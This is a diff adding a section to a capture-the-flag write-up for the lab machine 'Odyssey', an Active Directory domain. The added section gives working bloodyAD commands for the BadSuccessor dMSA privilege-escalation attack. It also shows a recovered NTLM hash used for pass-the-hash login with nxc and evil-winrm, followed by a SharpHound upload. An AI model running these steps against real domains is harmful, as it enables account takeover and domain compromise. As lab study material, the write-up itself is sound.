@@ -1,7 +1,5 @@
 # Odyssey
 
-<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
-
 <mark style="color:blue;">**Step 1**</mark>
 
 **Let's start off with a quick nmap scan.**
@@ -1895,5 +1893,80 @@ bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.
 
 
 bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object "CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb"
+```
+{% endcode %}
+
+**so overlooking each one of them give this**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' --attr nTSecurityDescriptor
+
+(OA;;WP;3752e002-43be-48c8-b3ca-2cb2fffbc8a1;;S-1-5-21-4175332977-3571604968-1809176562-7102)(OA;;WP;a0945b2b-57a2-43bd-b327-4d112a4e8bd1;;S-1-5-21-4175332977-3571604968-1809176562-7102)(OA;;WP;a4693096-a4c3-4ecd-b8cb-73cd6398b7a2;;S-1-5-21-4175332977-3571604968-1809176562-7102)
+
+bloodyAD -H $dc -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object 'S-1-5-21-4175332977-3571604968-1809176562-7102' --attr sAMAccountName
+# sAMAccountName: PipelineMigrationOps am on this group 
+
+bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object 'OU=Migrations,DC=odyssey,DC=htb' --attr nTSecurityDescriptor
+
+(OA;;CC;0feb936f-47b3-49f2-9386-1dedc2c23765;;S-1-5-21-4175332977-3571604968-1809176562-7102)
+
+```
+{% endcode %}
+
+{% hint style="info" %}
+**SVC\_DEPLOY : WRITE ON 2 ATTRIBUTES**&#x20;
+
+**Attribute msDS-SupersededManagedAccountLink**
+
+**Attribute msDS-SupersededServiceAccountState**
+
+
+
+
+
+**OU migration that contain svc\_deploy  : WRITE ON 1 attributes**
+
+**msDS-DelegatedManagedServiceAccount (**&#x54;he delegated managed service account class is used to create an account which can supersede a legacy service account and can be shared by different computers.**)**
+{% endhint %}
+
+**With this attributes we have the BadSuccessor attack**
+
+{% hint style="warning" %}
+**BadSuccessor Bug**
+
+\
+**All an attacker needed was an OU with CreateChild permissions, which would allow them to create a dMSA account. Once this account is created, an attacker can use specific attributes, namely&#x20;**_**msDS-GroupMSAMembership**_**&#x20;and&#x20;**_**msDS-ManagedAccountPrecededByLink**_**&#x20;on the dMSA account, to impersonate any user (yes, including domain admins) in the domain.**
+{% endhint %}
+
+{% hint style="danger" %}
+**On August 12**<sup>**th**</sup>**, 2025**
+
+**Credential and privilege acquisition (shadow credentials alternative)**&#x20;
+
+**Today, If an attacker controls a target principal (e.g., has GenericWrite on a user or computer), they can compromise it either by adding a shadow credential, or by performing a targeted Kerberoasting attack.**
+
+[**https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch**](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
+{% endhint %}
+
+**So what i understand if i can create a Dmsa and i control it i can add shadow creds**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+bloodyad -H $dc -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k add badSuccessor gb05_dmsa -t 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' --ou "OU=Migrations,DC=odyssey,DC=htb"
+# 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
+```
+{% endcode %}
+
+**Attribute msDS-SupersededManagedAccountLink because of this attrbitue we retriev also for the svc deploy hash**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+nxc smb 172.16.0.10 -u "svc-aegis-deploy" -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
+#  [+] odyssey.htb\svc-aegis-deploy:3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
+
+evil-winrm -i 172.16.0.10 -u "svc-aegis-deploy" -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
+upload /home/gb05/Desktop/CPTS_PREP/ADtools/SharpHound.exe
+.\SharpHound.exe -c All -d odyssey.htb
 ```
 {% endcode %}
